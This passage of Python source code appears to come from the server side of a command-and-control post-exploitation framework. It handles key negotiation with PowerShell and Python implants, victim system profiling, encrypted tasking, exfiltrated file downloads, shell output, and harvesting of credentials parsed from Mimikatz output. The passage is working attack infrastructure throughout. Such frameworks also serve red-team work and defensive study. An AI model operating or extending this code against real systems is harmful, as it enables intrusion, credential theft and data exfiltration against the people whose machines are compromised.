                        encryptedMsg = encryption.rsa_encrypt(rsaKey, data)
                        # TODO: wrap this in a routing packet!

                        return encryptedMsg

                    else:
                        dispatcher.send("[!] Agent %s returned an invalid PowerShell public key!" % (sessionID), sender='Agents')
                        return 'ERROR: Invalid PowerShell public key'

            elif language.lower() == 'python':
                if ((len(message) < 1000) or (len(message) > 2500)):
                    dispatcher.send("[!] Invalid Python key post format from %s" % (sessionID), sender='Agents')
                    return "Error: Invalid Python key post format from %s" % (sessionID)
                else:
                    try:
                        int(message)
                    except:
                        dispatcher.send("[!] Invalid Python key post format from %s" % (sessionID), sender='Agents')
                        return "Error: Invalid Python key post format from %s" % (sessionID)

                    # client posts PUBc key
                    clientPub = int(message)
                    serverPub = encryption.DiffieHellman()
                    serverPub.genKey(clientPub)
                    # serverPub.key == the negotiated session key

                    nonce = helpers.random_string(16, charset=string.digits)

                    dispatcher.send("[*] Agent %s from %s posted valid Python PUB key" % (sessionID, clientIP), sender='Agents')

                    delay = listenerOptions['DefaultDelay']['Value']
                    jitter = listenerOptions['DefaultJitter']['Value']
                    profile = listenerOptions['DefaultProfile']['Value']
                    killDate = listenerOptions['KillDate']['Value']
                    workingHours = listenerOptions['WorkingHours']['Value']
                    lostLimit = listenerOptions['DefaultLostLimit']['Value']

                    # add the agent to the database now that it's "checked in"
                    self.mainMenu.agents.add_agent(sessionID, clientIP, delay, jitter, profile, killDate, workingHours, lostLimit, sessionKey=serverPub.key, nonce=nonce, listener=listenerName)

                    # step 4 of negotiation -> server returns HMAC(AESn(nonce+PUBs))
                    data = "%s%s" % (nonce, serverPub.publicKey)
                    encryptedMsg = encryption.aes_encrypt_then_hmac(stagingKey, data)
                    # TODO: wrap this in a routing packet?

                    return encryptedMsg

            else:
                dispatcher.send("[*] Agent %s from %s using an invalid language specification: %s" % (sessionID, clientIP, language), sender='Agents')
                'ERROR: invalid language: %s' % (language)

        elif meta == 'STAGE2':
            # step 5 of negotiation -> client posts nonce+sysinfo and requests agent

            sessionKey = self.agents[sessionID]['sessionKey']

            try:
                message = encryption.aes_decrypt_and_verify(sessionKey, encData)
                parts = message.split('|')

                if len(parts) < 12:
                    dispatcher.send("[!] Agent %s posted invalid sysinfo checkin format: %s" % (sessionID, message), sender='Agents')
                    # remove the agent from the cache/database
                    self.mainMenu.agents.remove_agent_db(sessionID)
                    return "ERROR: Agent %s posted invalid sysinfo checkin format: %s" % (sessionID, message)

                # verify the nonce
                if int(parts[0]) != (int(self.mainMenu.agents.get_agent_nonce_db(sessionID)) + 1):
                    dispatcher.send("[!] Invalid nonce returned from %s" % (sessionID), sender='Agents')
                    # remove the agent from the cache/database
                    self.mainMenu.agents.remove_agent_db(sessionID)
                    return "ERROR: Invalid nonce returned from %s" % (sessionID)

                dispatcher.send("[!] Nonce verified: agent %s posted valid sysinfo checkin format: %s" % (sessionID, message), sender='Agents')

                # listener = parts[1].encode('ascii', 'ignore')
                domainname = parts[2].encode('ascii', 'ignore')
                username = parts[3].encode('ascii', 'ignore')
                hostname = parts[4].encode('ascii', 'ignore')
                external_ip = clientIP.encode('ascii', 'ignore')
                internal_ip = parts[5].encode('ascii', 'ignore')
                os_details = parts[6].encode('ascii', 'ignore')
                high_integrity = parts[7].encode('ascii', 'ignore')
                process_name = parts[8].encode('ascii', 'ignore')
                process_id = parts[9].encode('ascii', 'ignore')
                language = parts[10].encode('ascii', 'ignore')
                language_version = parts[11].encode('ascii', 'ignore')
                if high_integrity == "True":
                    high_integrity = 1
                else:
                    high_integrity = 0

            except Exception as e:
                dispatcher.send("[!] Exception in agents.handle_agent_staging() for %s : %s" % (sessionID, e), sender='Agents')
                # remove the agent from the cache/database
                self.mainMenu.agents.remove_agent_db(sessionID)
                return "Error: Exception in agents.handle_agent_staging() for %s : %s" % (sessionID, e)

            if domainname and domainname.strip() != '':
                username = "%s\\%s" % (domainname, username)

            # update the agent with this new information
            self.mainMenu.agents.update_agent_sysinfo_db(sessionID, listener=listenerName, internal_ip=internal_ip, username=username, hostname=hostname, os_details=os_details, high_integrity=high_integrity, process_name=process_name, process_id=process_id, language_version=language_version, language=language)

            # signal everyone that this agent is now active
            dispatcher.send("[+] Initial agent %s from %s now active" % (sessionID, clientIP), sender='Agents')
            output = "[+] Agent %s now active:\n" % (sessionID)

            # save the initial sysinfo information in the agent log
            agent = self.mainMenu.agents.get_agent_db(sessionID)
            output = messages.display_agent(agent, returnAsString=True)
            output += "\n[+] Agent %s now active:\n" % (sessionID)
            self.mainMenu.agents.save_agent_log(sessionID, output)

            # if a script autorun is set, set that as the agent's first tasking
            autorun = self.get_autoruns_db()
            if autorun and autorun[0] != '' and autorun[1] != '':
                self.add_agent_task_db(sessionID, autorun[0], autorun[1])

            return "STAGE2: %s" % (sessionID)

        else:
            dispatcher.send("[!] Invalid staging request packet from %s at %s : %s" % (sessionID, clientIP, meta), sender='Agents')


    def handle_agent_data(self, stagingKey, routingPacket, listenerOptions, clientIP='0.0.0.0'):
        """
        Take the routing packet w/ raw encrypted data from an agent and
        process as appropriately.

        Abstracted out sufficiently for any listener module to use.
        """

        if len(routingPacket) < 20:
            dispatcher.send("[!] handle_agent_data(): routingPacket wrong length: %s" %(len(routingPacket)), sender='Agents')
            return None

        routingPacket = packets.parse_routing_packet(stagingKey, routingPacket)

        if not routingPacket:
            return [('', "ERROR: invalid routing packet")]

        dataToReturn = []

        # process each routing packet
        for sessionID, (language, meta, additional, encData) in routingPacket.iteritems():

            if meta == 'STAGE0' or meta == 'STAGE1' or meta == 'STAGE2':
                dispatcher.send("[*] handle_agent_data(): sessionID %s issued a %s request" % (sessionID, meta), sender='Agents')
                dataToReturn.append((language, self.handle_agent_staging(sessionID, language, meta, additional, encData, stagingKey, listenerOptions, clientIP)))

            elif sessionID not in self.agents:
                dispatcher.send("[!] handle_agent_data(): sessionID %s not present" % (sessionID), sender='Agents')
                dataToReturn.append(('', "ERROR: sessionID %s not in cache!" % (sessionID)))

            elif meta == 'TASKING_REQUEST':
                dispatcher.send("[*] handle_agent_data(): sessionID %s issued a TASKING_REQUEST" % (sessionID), sender='Agents')
                dataToReturn.append((language, self.handle_agent_request(sessionID, language, stagingKey)))

            elif meta == 'RESULT_POST':
                dispatcher.send("[*] handle_agent_data(): sessionID %s issued a RESULT_POST" % (sessionID), sender='Agents')
                dataToReturn.append((language, self.handle_agent_response(sessionID, encData)))

            else:
                dispatcher.send("[!] handle_agent_data(): sessionID %s gave unhandled meta tag in routing packet: %s" % (sessionID, meta), sender='Agents')

        return dataToReturn


    def handle_agent_request(self, sessionID, language, stagingKey):
        """
        Update the agent's last seen time and return any encrypted taskings.

        TODO: does this need self.lock?
        """

        if sessionID not in self.agents:
            dispatcher.send("[!] handle_agent_request(): sessionID %s not present" % (sessionID), sender='Agents')
            return None

        # update the client's last seen time
        self.update_agent_lastseen_db(sessionID)

        # retrieve all agent taskings from the cache
        taskings = self.get_agent_tasks_db(sessionID)

        if taskings and taskings != []:

            all_task_packets = ''

            # build tasking packets for everything we have
            for tasking in taskings:
                task_name, task_data, res_id = tasking
                all_task_packets += packets.build_task_packet(task_name, task_data, res_id)

            # get the session key for the agent
            session_key = self.agents[sessionID]['sessionKey']

            # encrypt the tasking packets with the agent's session key
            encrypted_data = encryption.aes_encrypt_then_hmac(session_key, all_task_packets)

            return packets.build_routing_packet(stagingKey, sessionID, language, meta='SERVER_RESPONSE', encData=encrypted_data)

        # if no tasking for the agent
        else:
            return None


    def handle_agent_response(self, sessionID, encData):
        """
        Takes a sessionID and posted encrypted data response, decrypt
        everything and handle results as appropriate.

        TODO: does this need self.lock?
        """

        if sessionID not in self.agents:
            dispatcher.send("[!] handle_agent_response(): sessionID %s not in cache" % (sessionID), sender='Agents')
            return None

        # extract the agent's session key
        sessionKey = self.agents[sessionID]['sessionKey']

        # update the client's last seen time
        self.update_agent_lastseen_db(sessionID)

        try:
            # verify, decrypt and depad the packet
            packet = encryption.aes_decrypt_and_verify(sessionKey, encData)

            # process the packet and extract necessary data
            responsePackets = packets.parse_result_packets(packet)
            results = False

            # process each result packet
            for (responseName, totalPacket, packetNum, taskID, length, data) in responsePackets:
                # process the agent's response
                self.process_agent_packet(sessionID, responseName, taskID, data)
                results = True

            if results:
                # signal that this agent returned results
                dispatcher.send("[*] Agent %s returned results." % (sessionID), sender='Agents')

            # return a 200/valid
            return 'VALID'

        except Exception as e:
            dispatcher.send("[!] Error processing result packet from %s : %s" % (sessionID, e), sender='Agents')

            # TODO: stupid concurrency...
            #   when an exception is thrown, something causes the lock to remain locked...
            # if self.lock.locked():
            #     self.lock.release()

            return None


    def process_agent_packet(self, sessionID, responseName, taskID, data):
        """
        Handle the result packet based on sessionID and responseName.
        """

        agentSessionID = sessionID

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id_db(sessionID)
        if nameid:
            sessionID = nameid

        conn = self.get_db_connection()
        try:
            self.lock.acquire()
            # report the agent result in the reporting database
            cur = conn.cursor()
            cur.execute("INSERT INTO reporting (name, event_type, message, time_stamp, taskID) VALUES (?,?,?,?,?)", (agentSessionID, "result", responseName, helpers.get_datetime(), taskID))

            # insert task results into the database, if it's not a file
            if taskID != 0 and responseName not in ["TASK_DOWNLOAD", "TASK_CMD_JOB_SAVE", "TASK_CMD_WAIT_SAVE"] and data != None:
                # if the taskID does not exist for this agent, create it
                if cur.execute("SELECT * FROM results WHERE id=? AND agent=?", [taskID, sessionID]).fetchone() is None:
                    pk = cur.execute("SELECT max(id) FROM results WHERE agent=?", [sessionID]).fetchone()[0]
                    if pk is None:
                        pk = 0
                    # only 2 bytes for the task ID, so wraparound
                    pk = (pk + 1) % 65536
                    cur.execute("INSERT INTO results (id, agent, data) VALUES (?,?,?)",(pk, sessionID, data))
                else:
                    cur.execute("UPDATE results SET data=data||? WHERE id=? AND agent=?", [data, taskID, sessionID])

        finally:
            cur.close()
            self.lock.release()

        # TODO: for heavy traffic packets, check these first (i.e. SOCKS?)
        #       so this logic is skipped

        if responseName == "ERROR":
            # error code
            dispatcher.send("[!] Received error response from " + str(sessionID), sender='Agents')
            self.update_agent_results_db(sessionID, data)
            # update the agent log
            self.save_agent_log(sessionID, "[!] Error response: " + data)


        elif responseName == "TASK_SYSINFO":
            # sys info response -> update the host info
            parts = data.split("|")
            if len(parts) < 12:
                dispatcher.send("[!] Invalid sysinfo response from " + str(sessionID), sender='Agents')
            else:
                print "sysinfo:",data
                # extract appropriate system information
                listener = parts[1].encode('ascii', 'ignore')
                domainname = parts[2].encode('ascii', 'ignore')
                username = parts[3].encode('ascii', 'ignore')
                hostname = parts[4].encode('ascii', 'ignore')
                internal_ip = parts[5].encode('ascii', 'ignore')
                os_details = parts[6].encode('ascii', 'ignore')
                high_integrity = parts[7].encode('ascii', 'ignore')
                process_name = parts[8].encode('ascii', 'ignore')
                process_id = parts[9].encode('ascii', 'ignore')
                language = parts[10].encode('ascii', 'ignore')
                language_version = parts[11].encode('ascii', 'ignore')
                if high_integrity == 'True':
                    high_integrity = 1
                else:
                    high_integrity = 0

                # username = str(domainname)+"\\"+str(username)
                username = "%s\\%s" % (domainname, username)

                # update the agent with this new information
                self.mainMenu.agents.update_agent_sysinfo_db(sessionID, listener=listener, internal_ip=internal_ip, username=username, hostname=hostname, os_details=os_details, high_integrity=high_integrity, process_name=process_name, process_id=process_id, language_version=language_version, language=language)

                sysinfo = '{0: <18}'.format("Listener:") + listener + "\n"
                sysinfo += '{0: <16}'.format("Internal IP:") + internal_ip + "\n"
                sysinfo += '{0: <18}'.format("Username:") + username + "\n"
                sysinfo += '{0: <16}'.format("Hostname:") + hostname + "\n"
                sysinfo += '{0: <18}'.format("OS:") + os_details + "\n"
                sysinfo += '{0: <18}'.format("High Integrity:") + str(high_integrity) + "\n"
                sysinfo += '{0: <18}'.format("Process Name:") + process_name + "\n"
                sysinfo += '{0: <18}'.format("Process ID:") + process_id + "\n"
                sysinfo += '{0: <18}'.format("Language:") + language + "\n"
                sysinfo += '{0: <18}'.format("Language Version:") + language_version + "\n"

                self.update_agent_results_db(sessionID, sysinfo)
                # update the agent log
                self.save_agent_log(sessionID, sysinfo)


        elif responseName == "TASK_EXIT":
            # exit command response

            # let everyone know this agent exited
            dispatcher.send(data, sender='Agents')

            # update the agent results and log
            # self.update_agent_results(sessionID, data)
            self.save_agent_log(sessionID, data)

            # remove this agent from the cache/database
            self.remove_agent_db(sessionID)


        elif responseName == "TASK_SHELL":
            # shell command response
            self.update_agent_results_db(sessionID, data)
            # update the agent log
            self.save_agent_log(sessionID, data)


        elif responseName == "TASK_DOWNLOAD":
            # file download
            parts = data.split("|")
            if len(parts) != 3:
                dispatcher.send("[!] Received invalid file download response from " + sessionID, sender='Agents')
            else:
                index, path, data = parts
                # decode the file data and save it off as appropriate
                file_data = helpers.decode_base64(data)
                name = self.get_agent_name_db(sessionID)

                if index == "0":
                    self.save_file(name, path, file_data)
                else:
                    self.save_file(name, path, file_data, append=True)
                # update the agent log
                msg = "file download: %s, part: %s" % (path, index)
                self.save_agent_log(sessionID, msg)


        elif responseName == "TASK_UPLOAD":
            pass


        elif responseName == "TASK_GETJOBS":

            if not data or data.strip().strip() == "":
                data = "[*] No active jobs"

            # running jobs
            self.update_agent_results_db(sessionID, data)
            # update the agent log
            self.save_agent_log(sessionID, data)


        elif responseName == "TASK_STOPJOB":
            # job kill response
            self.update_agent_results_db(sessionID, data)
            # update the agent log
            self.save_agent_log(sessionID, data)


        elif responseName == "TASK_CMD_WAIT":

            # dynamic script output -> blocking
            self.update_agent_results_db(sessionID, data)

            # see if there are any credentials to parse
            time = helpers.get_datetime()
            creds = helpers.parse_credentials(data)

            if creds:
                for cred in creds:

                    hostname = cred[4]

                    if hostname == "":
                        hostname = self.get_agent_hostname_db(sessionID)

                    osDetails = self.get_agent_os_db(sessionID)

                    self.mainMenu.credentials.add_credential(cred[0], cred[1], cred[2], cred[3], hostname, osDetails, cred[5], time)

            # update the agent log
            self.save_agent_log(sessionID, data)


        elif responseName == "TASK_CMD_WAIT_SAVE":
            # dynamic script output -> blocking, save data
            name = self.get_agent_name_db(sessionID)

            # extract the file save prefix and extension
            prefix = data[0:15].strip()
            extension = data[15:20].strip()
            file_data = helpers.decode_base64(data[20:])

            # save the file off to the appropriate path
            save_path = "%s/%s_%s.%s" % (prefix, self.get_agent_hostname_db(sessionID), helpers.get_file_datetime(), extension)
            final_save_path = self.save_module_file(name, save_path, file_data)

            # update the agent log
            msg = "Output saved to .%s" % (final_save_path)
            self.update_agent_results_db(sessionID, msg)
            self.save_agent_log(sessionID, msg)


        elif responseName == "TASK_CMD_JOB":

            # dynamic script output -> non-blocking
            self.update_agent_results_db(sessionID, data)
            # update the agent log
            self.save_agent_log(sessionID, data)

            # TODO: redo this regex for really large AD dumps
            #   so a ton of data isn't kept in memory...?
            parts = data.split("\n")
            if len(parts) > 10:
                time = helpers.get_datetime()
                if parts[0].startswith("Hostname:"):
                    # if we get Invoke-Mimikatz output, try to parse it and add
                    #   it to the internal credential store

                    # cred format: (credType, domain, username, password, hostname, sid, notes)
                    creds = helpers.parse_mimikatz(data)

                    for cred in creds:
                        hostname = cred[4]

                        if hostname == "":
                            hostname = self.get_agent_hostname_db(sessionID)

                        osDetails = self.get_agent_os_db(sessionID)

                        self.mainMenu.credentials.add_credential(cred[0], cred[1], cred[2], cred[3], hostname, osDetails, cred[5], time)


        elif responseName == "TASK_CMD_JOB_SAVE":
            # dynamic script output -> non-blocking, save data
            name = self.get_agent_name_db(sessionID)

            # extract the file save prefix and extension
            prefix = data[0:15].strip()
            extension = data[15:20].strip()
            file_data = helpers.decode_base64(data[20:])

            # save the file off to the appropriate path
            save_path = "%s/%s_%s.%s" % (prefix, self.get_agent_hostname_db(sessionID), helpers.get_file_datetime(), extension)
            final_save_path = self.save_module_file(name, save_path, file_data)

            # update the agent log
            msg = "Output saved to .%s" % (final_save_path)
            self.update_agent_results_db(sessionID, msg)
            self.save_agent_log(sessionID, msg)


        elif responseName == "TASK_SCRIPT_IMPORT":
            self.update_agent_results_db(sessionID, data)
            # update the agent log
            self.save_agent_log(sessionID, data)

        elif responseName == "TASK_IMPORT_MODULE":
            self.update_agent_results_db(sessionID, data)
            # update the agent log
            self.save_agent_log(sessionID, data)

        elif responseName == "TASK_VIEW_MODULE":
            self.update_agent_results_db(sessionID, data)
            #update the agent log
            self.save_agent_log(sessionID, data)

        elif responseName == "TASK_REMOVE_MODULE":
            self.update_agent_results_db(sessionID, data)
            #update the agent log
            self.save_agent_log(sessionID, data)

        elif responseName == "TASK_SCRIPT_COMMAND":
            self.update_agent_results_db(sessionID, data)
            # update the agent log
            self.save_agent_log(sessionID, data)

        elif responseName == "TASK_SWITCH_LISTENER":
            # update the agent listener
            self.update_agent_listener_db(sessionID, data)
            dispatcher.send("[+] Listener for '%s' updated to '%s'" % (sessionID, data), sender='Agents')

        else:
            print helpers.color("[!] Unknown response %s from %s" % (responseName, sessionID))
